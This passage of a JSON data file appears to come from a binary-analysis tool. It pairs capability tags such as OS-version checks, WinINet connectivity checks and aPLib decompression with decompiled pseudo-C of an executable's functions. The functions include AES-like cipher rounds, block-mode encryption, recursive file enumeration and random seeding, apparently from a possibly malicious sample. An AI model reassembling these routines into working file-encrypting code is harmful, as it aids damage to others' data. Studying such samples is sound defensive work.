   uVar8 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x40a9a8) ^ *((var_14h >> 8 & 0xff) * 4 + 0x40add0) ^\n            *((var_8h >> 0x18) * 4 + 0x40a5a8) ^ *((var_4h & 0xff) * 4 + 0x40b1d0) ^ puVar1[1];\n    uVar2 = *((var_8h >> 8 & 0xff) * 4 + 0x40add0) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n            *((var_14h >> 0x18) * 4 + 0x40a5a8) ^ *((uVar2 & 0xff) * 4 + 0x40b1d0) ^ puVar1[3];\n    uVar7 = CONCAT31(CONCAT21(CONCAT11(*((uVar8 >> 0x18) + 0x40c5d0), *((uVar4 >> 0x10 & 0xff) + 0x40c5d0)), \n                              *((uVar2 >> 8 & 0xff) + 0x40c5d0)), *((uVar3 & 0xff) + 0x40c5d0)) ^ puVar1[4];\n    uVar5 = CONCAT31(CONCAT21(CONCAT11(*((uVar4 >> 0x18) + 0x40c5d0), *((uVar2 >> 0x10 & 0xff) + 0x40c5d0)), \n                              *((uVar3 >> 8 & 0xff) + 0x40c5d0)), *((uVar8 & 0xff) + 0x40c5d0)) ^ puVar1[5];\n    uVar6 = CONCAT31(CONCAT21(CONCAT11(*((uVar2 >> 0x18) + 0x40c5d0), *((uVar3 >> 0x10 & 0xff) + 0x40c5d0)), \n                              *((uVar8 >> 8 & 0xff) + 0x40c5d0)), *((uVar4 & 0xff) + 0x40c5d0)) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(*((uVar3 >> 0x18) + 0x40c5d0), *((uVar8 >> 0x10 & 0xff) + 0x40c5d0)), \n                              *((uVar4 >> 8 & 0xff) + 0x40c5d0)), *((uVar2 & 0xff) + 0x40c5d0)) ^ puVar1[7];\n    unaff_ESI[1] = uVar7 >> 8;\n    *unaff_ESI = uVar7;\n    unaff_ESI[3] = uVar7 >> 0x18;\n    unaff_ESI[2] = uVar7 >> 0x10;\n    unaff_ESI[4] = uVar5;\n    unaff_ESI[5] = uVar5 >> 8;\n    unaff_ESI[7] = uVar5 >> 0x18;\n    unaff_ESI[9] = uVar6 >> 8;\n    unaff_ESI[10] = uVar6 >> 0x10;\n    unaff_ESI[0xd] = uVar2 >> 8;\n    unaff_ESI[0xc] = uVar2;\n    unaff_ESI[8] = uVar6;\n    unaff_ESI[0xe] = uVar2 >> 0x10;\n    unaff_ESI[0xf] = uVar2 >> 0x18;\n    unaff_ESI[6] = uVar5 >> 0x10;\n    unaff_ESI[0xb] = uVar6 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2368
    },
    "004071bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004071bf(int32_t *arg_8h)\n\n{\n    uint32_t *in_EAX;\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *unaff_ESI;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_8h[1];\n    var_4h = *in_EAX ^ *puVar1;\n    var_8h = in_EAX[1] ^ puVar1[1];\n    uVar7 = in_EAX[2] ^ puVar1[2];\n    var_ch = in_EAX[3] ^ puVar1[3];\n    iVar2 = *arg_8h >> 1;\n    puVar1 = puVar1 + 4;\n    while( true ) {\n        iVar2 = iVar2 + -1;\n        if (iVar2 < 1) break;\n        uVar4 = *((var_ch >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x40bdd0) ^\n                *((var_4h >> 0x18) * 4 + 0x40b5d0) ^ *((var_8h & 0xff) * 4 + 0x40c1d0) ^ puVar1[1];\n        uVar5 = *((var_ch >> 8 & 0xff) * 4 + 0x40bdd0) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40b9d0) ^\n                *((var_8h >> 0x18) * 4 + 0x40b5d0) ^ *((uVar7 & 0xff) * 4 + 0x40c1d0) ^ puVar1[2];\n        uVar3 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((var_8h >> 8 & 0xff) * 4 + 0x40bdd0) ^\n                *((var_ch >> 0x18) * 4 + 0x40b5d0) ^ *((var_4h & 0xff) * 4 + 0x40c1d0) ^ *puVar1;\n        uVar6 = *((var_8h >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((var_4h >> 8 & 0xff) * 4 + 0x40bdd0) ^\n                *((uVar7 >> 0x18) * 4 + 0x40b5d0) ^ *((var_ch & 0xff) * 4 + 0x40c1d0) ^ puVar1[3];\n        var_4h = *((uVar5 >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((uVar4 >> 8 & 0xff) * 4 + 0x40bdd0) ^\n                 *((uVar6 >> 0x18) * 4 + 0x40b5d0) ^ *((uVar3 & 0xff) * 4 + 0x40c1d0) ^ puVar1[4];\n        var_8h = *((uVar6 >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((uVar5 >> 8 & 0xff) * 4 + 0x40bdd0) ^\n                 *((uVar3 >> 0x18) * 4 + 0x40b5d0) ^ *((uVar4 & 0xff) * 4 + 0x40c1d0) ^ puVar1[5];\n        uVar7 = *((uVar6 >> 8 & 0xff) * 4 + 0x40bdd0) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40b9d0) ^\n                *((uVar4 >> 0x18) * 4 + 0x40b5d0) ^ *((uVar5 & 0xff) * 4 + 0x40c1d0) ^ puVar1[6];\n        var_ch = *((uVar4 >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x40bdd0) ^\n                 *((uVar5 >> 0x18) * 4 + 0x40b5d0) ^ *((uVar6 & 0xff) * 4 + 0x40c1d0) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar3 = *((var_ch >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x40bdd0) ^\n            *((var_4h >> 0x18) * 4 + 0x40b5d0) ^ *((var_8h & 0xff) * 4 + 0x40c1d0) ^ puVar1[1];\n    uVar4 = *((var_ch >> 8 & 0xff) * 4 + 0x40bdd0) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40b9d0) ^\n            *((var_8h >> 0x18) * 4 + 0x40b5d0) ^ *((uVar7 & 0xff) * 4 + 0x40c1d0) ^ puVar1[2];\n    uVar5 = *((var_8h >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((var_4h >> 8 & 0xff) * 4 + 0x40bdd0) ^\n            *((uVar7 >> 0x18) * 4 + 0x40b5d0) ^ *((var_ch & 0xff) * 4 + 0x40c1d0) ^ puVar1[3];\n    uVar9 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x40b9d0) ^ *((var_8h >> 8 & 0xff) * 4 + 0x40bdd0) ^\n            *((var_ch >> 0x18) * 4 + 0x40b5d0) ^ *((var_4h & 0xff) * 4 + 0x40c1d0) ^ *puVar1;\n    uVar8 = CONCAT31(CONCAT21(CONCAT11(*((uVar5 >> 0x18) + 0x40a4a8), *((uVar4 >> 0x10 & 0xff) + 0x40a4a8)), \n                              *((uVar3 >> 8 & 0xff) + 0x40a4a8)), *((uVar9 & 0xff) + 0x40a4a8)) ^ puVar1[4];\n    uVar7 = CONCAT31(CONCAT21(CONCAT11(*((uVar9 >> 0x18) + 0x40a4a8), *((uVar5 >> 0x10 & 0xff) + 0x40a4a8)), \n                              *((uVar4 >> 8 & 0xff) + 0x40a4a8)), *((uVar3 & 0xff) + 0x40a4a8)) ^ puVar1[5];\n    uVar6 = CONCAT31(CONCAT21(CONCAT11(*((uVar3 >> 0x18) + 0x40a4a8), *((uVar9 >> 0x10 & 0xff) + 0x40a4a8)), \n                              *((uVar5 >> 8 & 0xff) + 0x40a4a8)), *((uVar4 & 0xff) + 0x40a4a8)) ^ puVar1[6];\n    uVar3 = CONCAT31(CONCAT21(CONCAT11(*((uVar4 >> 0x18) + 0x40a4a8), *((uVar3 >> 0x10 & 0xff) + 0x40a4a8)), \n                              *((uVar9 >> 8 & 0xff) + 0x40a4a8)), *((uVar5 & 0xff) + 0x40a4a8)) ^ puVar1[7];\n    unaff_ESI[1] = uVar8 >> 8;\n    *unaff_ESI = uVar8;\n    unaff_ESI[3] = uVar8 >> 0x18;\n    unaff_ESI[2] = uVar8 >> 0x10;\n    unaff_ESI[4] = uVar7;\n    unaff_ESI[5] = uVar7 >> 8;\n    unaff_ESI[7] = uVar7 >> 0x18;\n    unaff_ESI[6] = uVar7 >> 0x10;\n    unaff_ESI[8] = uVar6;\n    unaff_ESI[9] = uVar6 >> 8;\n    unaff_ESI[0xb] = uVar6 >> 0x18;\n    unaff_ESI[0xd] = uVar3 >> 8;\n    unaff_ESI[0xc] = uVar3;\n    unaff_ESI[0xe] = uVar3 >> 0x10;\n    unaff_ESI[10] = uVar6 >> 0x10;\n    unaff_ESI[0xf] = uVar3 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2344
    },
    "004076e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004076e5(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00404c43(arg_8h, 0, 0x128);\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "0040794a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040794a(uint arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch == 1) {\n        fcn.004071bf(arg_8h);\n    }\n    else {\n        fcn.00406ca2(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00407bc3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407bc3(int32_t arg_8h, int32_t arg_ch, uint8_t *arg_10h)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint8_t *var_4h;\n    \n    if ((in_EAX & 0xf) == 0) {\n        if (arg_ch == 0) {\n            if (in_EAX != 0) {\n                iVar4 = (arg_8h + 8) - in_ECX;\n                var_4h = arg_10h;\n                iVar5 = (in_EAX - 1 >> 4) + 1;\n                do {\n                    fcn.00404c71(&var_14h, var_4h, 0x10);\n                    fcn.00406ca2(arg_8h);\n                    iVar2 = 0x10;\n                    do {\n                        *in_ECX = *in_ECX ^ in_ECX[iVar4];\n                        in_ECX = in_ECX + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                    fcn.00404c71(arg_8h + 8, &var_14h, 0x10);\n                    var_4h = var_4h + 0x10;\n                    iVar4 = iVar4 + -0x10;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n        }\n        else if (in_EAX != 0) {\n            iVar5 = (arg_8h + 8) - arg_10h;\n            iVar4 = (in_EAX - 1 >> 4) + 1;\n            do {\n                var_4h = 0x10;\n                puVar3 = arg_10h;\n                do {\n                    puVar3[in_ECX - arg_10h] = puVar3[iVar5] ^ *puVar3;\n                    puVar3 = puVar3 + 1;\n                    var_4h = var_4h + -1;\n                } while (var_4h != NULL);\n                if (arg_ch == 1) {\n                    fcn.004071bf(arg_8h);\n                }\n                else {\n                    fcn.00406ca2(arg_8h);\n                }\n                fcn.00404c71(arg_8h + 8, in_ECX, 0x10);\n                arg_10h = arg_10h + 0x10;\n                iVar5 = iVar5 + -0x10;\n                in_ECX = in_ECX + 0x10;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0xffffffde;\n    }\n    return uVar1;\n}\n",
        "token_count": 674
    },
    "00407e13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00407e13(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    \n    if (arg_10h == 0) {\n        iVar1 = fcn.00407969(in_EAX, arg_8h, arg_ch);\n    }\n    else {\n        iVar1 = fcn.00407cb0(arg_8h, arg_ch);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 113
    },
    "00407ec6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00407ec6(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00404cfe(0x30);\n    if (piVar1 != NULL) {\n        iVar2 = fcn.00404cfe(in_EAX[1]);\n        piVar1[2] = iVar2;\n        iVar2 = fcn.00404cfe(*in_EAX * 0xc);\n        piVar1[1] = 0;\n        piVar1[3] = 0;\n        *piVar1 = iVar2;\n        fcn.00404c43(piVar1 + 4, 0, 0x20);\n        if ((piVar1[2] == 0) || (*piVar1 == 0)) {\n            fcn.00407e94();\n            piVar1 = NULL;\n        }\n        else {\n            piVar1[1] = *in_EAX;\n            piVar1[3] = in_EAX[1];\n            fcn.00404c71(*piVar1, in_EAX + 2, piVar1[1] * 0xc);\n            fcn.00404c71(piVar1[2], in_EAX + 2 + piVar1[1] * 3, piVar1[3]);\n            fcn.00404c71(piVar1 + 4, arg_8h, 0x20);\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 351
    },
    "00408047": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00408047(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    char cVar1;\n    char *arg_ch_00;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t arg_10h_00;\n    \n    while( true ) {\n        if (*arg_18h == 0) {\n            return 0;\n        }\n        iVar2 = fcn.00404fa3(arg_8h, *arg_18h, arg_ch);\n        if (iVar2 == 0) break;\n        arg_18h = arg_18h + 2;\n    }\n    arg_ch_00 = arg_18h[1];\n    pcVar3 = arg_ch_00;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    arg_10h_00 = pcVar3 - (arg_ch_00 + 1);\n    if (arg_14h < arg_10h_00) {\n        return arg_10h_00;\n    }\n    fcn.00404c71(arg_10h, arg_ch_00, arg_10h_00);\n    return arg_10h_00;\n}\n",
        "token_count": 305
    },
    "0040809c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040809c(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t *arg_ch_00;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    \n    while( true ) {\n        if (*arg_18h == 0) {\n            return 0;\n        }\n        iVar2 = fcn.00404f6c(arg_8h, *arg_18h, arg_ch);\n        if (iVar2 == 0) break;\n        arg_18h = arg_18h + 2;\n    }\n    arg_ch_00 = arg_18h[1];\n    piVar3 = arg_ch_00;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    uVar4 = piVar3 - (arg_ch_00 + 1) >> 1;\n    if (arg_14h < uVar4) {\n        return uVar4;\n    }\n    fcn.00404c71(arg_10h, arg_ch_00, uVar4 * 2);\n    return uVar4;\n}\n",
        "token_count": 299
    },
    "00408338": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408338(int16_t *arg_8h, code *arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int16_t iVar1;\n    int32_t arg_8h_00;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint lpFindFileData;\n    uint var_238h;\n    int16_t var_234h;\n    int32_t var_10h;\n    int32_t hFindFile;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    if (arg_8h != NULL) {\n        piVar2 = arg_8h;\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n        if (((piVar2 - (arg_8h + 1) >> 1) + 2U <= arg_14h) &&\n           (arg_8h_00 = fcn.00404cfe(arg_14h * 2 + 2),  arg_8h_00 != 0)) {\n            var_10h = arg_8h_00 - arg_8h;\n            piVar2 = arg_8h;\n            do {\n                iVar1 = *piVar2;\n                *(var_10h + piVar2) = iVar1;\n                piVar2 = piVar2 + 1;\n            } while (iVar1 != 0);\n            piVar2 = 0x40a444;\n            do {\n                piVar3 = piVar2;\n                piVar2 = piVar3 + 1;\n            } while (*piVar3 != 0);\n            puVar9 = arg_8h_00 + -2;\n            do {\n                piVar2 = puVar9 + 2;\n                puVar9 = puVar9 + 2;\n            } while (*piVar2 != 0);\n            puVar8 = 0x40a444;\n            for (uVar6 = piVar3 + -0x205221 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar9 = *puVar8;\n                puVar8 = puVar8 + 1;\n                puVar9 = puVar9 + 1;\n            }\n            for (uVar6 = piVar3 + -0x205221 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar9 = *puVar8;\n                puVar8 = puVar8 + 1;\n                puVar9 = puVar9 + 1;\n            }\n            hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(arg_8h_00, &lpFindFileData);\n            if (hFindFile != -1) {\n                do {\n                    if ((var_238h != 0x2e) || ((var_238h._2_2_ != 0 && ((var_238h._2_2_ != 0x2e || (var_234h != 0))))))\n                    {\n                        piVar2 = arg_8h;\n                        do {\n                            iVar1 = *piVar2;\n                            piVar2 = piVar2 + 1;\n                        } while (iVar1 != 0);\n                        puVar9 = &var_238h;\n                        do {\n                            iVar1 = *puVar9;\n                            puVar9 = puVar9 + 2;\n                        } while (iVar1 != 0);\n                        piVar3 = arg_8h;\n                        if ((puVar9 - (&var_238h + 2) >> 1) + 1 + (piVar2 - (arg_8h + 1) >> 1) <= arg_14h) {\n                            do {\n                                iVar1 = *piVar3;\n                                *(var_10h + piVar3) = iVar1;\n                                piVar3 = piVar3 + 1;\n                            } while (iVar1 != 0);\n                            piVar2 = 0x40a44c;\n                            do {\n                                piVar3 = piVar2;\n                                piVar2 = piVar3 + 1;\n                            } while (*piVar3 != 0);\n                            puVar9 = arg_8h_00 + -2;\n                            do {\n                                piVar2 = puVar9 + 2;\n                                puVar9 = puVar9 + 2;\n                            } while (*piVar2 != 0);\n                            puVar8 = 0x40a44c;\n                            for (uVar6 = piVar3 + -0x205225 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                *puVar9 = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                puVar9 = puVar9 + 1;\n                            }\n                            for (uVar6 = piVar3 + -0x205225 & 3; puVar4 = &var_238h,  uVar6 != 0; uVar6 = uVar6 - 1) {\n                                *puVar9 = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                puVar9 = puVar9 + 1;\n                            }\n                            do {\n                                iVar1 = *puVar4;\n                                puVar4 = puVar4 + 2;\n                            } while (iVar1 != 0);\n                            uVar6 = puVar4 - &var_238h;\n                            puVar9 = arg_8h_00 + -2;\n                            do {\n                                piVar2 = puVar9 + 2;\n                                puVar9 = puVar9 + 2;\n                            } while (*piVar2 != 0);\n                            puVar8 = &var_238h;\n                            for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                                *puVar9 = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                puVar9 = puVar9 + 1;\n                            }\n                            for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                *puVar9 = *puVar8;\n                                puVar8 = puVar8 + 1;\n                                puVar9 = puVar9 + 1;\n                            }\n                            iVar5 = (*arg_ch)(arg_8h, arg_8h_00, &lpFindFileData, arg_10h);\n                            if (iVar5 != 0) {\n                                if (iVar5 < 0) break;\n                                if ((arg_18h == 0) || ((lpFindFileData & 0x10) == 0)) {\n                                    var_8h = var_8h + 1;\n                                }\n                                else {\n                                    iVar5 = fcn.00408338(arg_8h_00, arg_ch, arg_10h, arg_14h, arg_18h + -1);\n                                    var_8h = var_8h + iVar5;\n                                }\n                            }\n                        }\n                    }\n                    iVar5 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                } while (iVar5 != 0);\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n            }\n            fcn.00404d6a(arg_8h_00);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1736
    },
    "0040861d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040861d(int32_t arg_8h, uint32_t arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t **ppiVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    \n    if (arg_10h != NULL) {\n        ppiVar2 = &arg_10h;\n        do {\n            ppiVar2 = ppiVar2 + 1;\n            piVar5 = *ppiVar2;\n            piVar3 = piVar5;\n            do {\n                iVar1 = *piVar3;\n                piVar3 = piVar3 + 1;\n            } while (iVar1 != 0);\n            uVar4 = piVar3 - (piVar5 + 1) >> 1;\n            if (arg_ch < uVar4) break;\n            iVar6 = arg_8h - piVar5;\n            do {\n                iVar1 = *piVar5;\n                *(iVar6 + piVar5) = iVar1;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            arg_ch = arg_ch - uVar4;\n            arg_10h = arg_10h + -1;\n            arg_8h = arg_8h + uVar4 * 2;\n        } while (arg_10h != NULL);\n    }\n    return arg_10h == NULL;\n}\n",
        "token_count": 337
    },
    "0040889a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040889a(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint lpSystemTime;\n    uint32_t lpFileTime;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(0x40c700, 4000);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x40c700);\n    pcVar1 = _sym.imp.KERNEL32.dll_QueryPerformanceCounter;\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(&var_8h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    *0x40c6e0 = *0x40c6e0 ^ uVar2;\n    *0x40c6e4 = *0x40c6e4 ^ var_4h;\n    *0x40c6e8 = *0x40c6e8 ^ var_8h;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    *0x40c6ec = *0x40c6ec ^ uVar2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *0x40c6f0 = *0x40c6f0 ^ uVar2;\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)(&lpSystemTime);\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, &lpFileTime);\n    *0x40c6f4 = *0x40c6f4 ^ var_ch;\n    *0x40c6f8 = *0x40c6f8 ^ lpFileTime;\n    (*pcVar1)(&var_8h);\n    *0x40c6fc = *0x40c6fc ^ var_4h;\n    *0x40c6e0 = *0x40c6e0 ^ var_8h;\n    do {\n        fcn.0040887c();\n    } while (*0x40c6e0 != '\\0');\n    *0x40c718 = 1;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x40c700);\n    return;\n}\n",
        "token_count": 518
    },
    "0040895e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040895e(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t arg_10h;\n    \n    if (*0x40c718 == '\\0') {\n        fcn.0040889a();\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x40c700);\n    if (in_EAX != 0) {\n        do {\n            arg_10h = 0x10;\n            if (in_EAX < 0x11) {\n                arg_10h = in_EAX;\n            }\n            fcn.00404c71(arg_8h, 0x40c6e0, arg_10h);\n            fcn.0040887c();\n            in_EAX = in_EAX - arg_10h;\n        } while (in_EAX != 0);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x40c700);\n    return in_EAX == 0;\n}\n",
        "token_count": 220
    },
    "004089ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004089ba(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t unaff_EDI;\n    \n    iVar2 = fcn.0040895e(unaff_EDI);\n    if (iVar2 != 0) {\n        iVar2 = 0;\n        if (0 < unaff_EBX) {\n            do {\n                cVar1 = *(iVar2 + unaff_EDI);\n                while (cVar1 == '\\0') {\n                    cVar1 = fcn.0040545d();\n                    *(iVar2 + unaff_EDI) = cVar1;\n                }\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < unaff_EBX);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "00402975": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402975(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *unaff_EDI;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = *(unaff_EDI[9] + 0x10);\n    uVar3 = *(unaff_EDI[9] + 0x14);\n    if ((*(unaff_EDI + 10) & 5) == 0) {\n        iVar5 = fcn.004026d0(&var_8h, 4);\n        if (iVar5 != 0) {\n            iVar5 = fcn.004026d0(arg_8h, var_8h);\n            if (iVar5 != 0) {\n                piVar1 = unaff_EDI + 0xb;\n                *piVar1 = *piVar1 + -1;\n                pcVar4 = _sym.imp.KERNEL32.dll_SetEvent;\n                if (*piVar1 == 0) {\n                    unaff_EDI[10] = unaff_EDI[10] | 4;\n                    (*_sym.imp.KERNEL32.dll_ResetEvent)(unaff_EDI[1]);\n                    (*pcVar4)(unaff_EDI[2]);\n                }\n    